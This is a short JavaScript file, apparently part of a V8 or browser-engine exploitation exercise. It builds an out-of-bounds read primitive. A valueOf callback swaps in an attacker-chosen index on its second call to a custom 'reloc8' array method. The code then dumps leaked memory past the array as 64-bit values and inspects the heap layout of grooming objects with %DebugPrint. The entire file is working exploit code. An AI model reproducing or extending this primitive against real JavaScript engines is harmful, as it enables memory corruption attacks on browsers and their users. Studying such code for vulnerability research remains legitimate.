// t2.js - raw dump of the region after arr's elements
let arr = new Array(100).fill(1.1);
let ta = new BigUint64Array(0x1337);
let probe = new Uint8Array(16);
let oarr = [{}];
let rw = [1.1];

let cvtbuf = new ArrayBuffer(8);
let cf = new Float64Array(cvtbuf);
let cu = new BigUint64Array(cvtbuf);
function f2i(f) { cf[0] = f; return cu[0]; }

let fromSt = { n: 0, idx: 0 };
let fromArg = { valueOf() { fromSt.n++; return fromSt.n === 2 ? fromSt.idx : 0; } };
function oobRead(i) { fromSt.n = 0; fromSt.idx = i; arr.reloc8(fromArg, 0); return f2i(arr[0]); }

let out = [];
for (let i = 100; i < 190; i++) {
  out.push(i + ":" + oobRead(i).toString(16));
}
%DebugPrint(arr);
%DebugPrint(ta);
%DebugPrint(probe);
%DebugPrint(oarr);
%DebugPrint(rw);
throw out.join("\n");
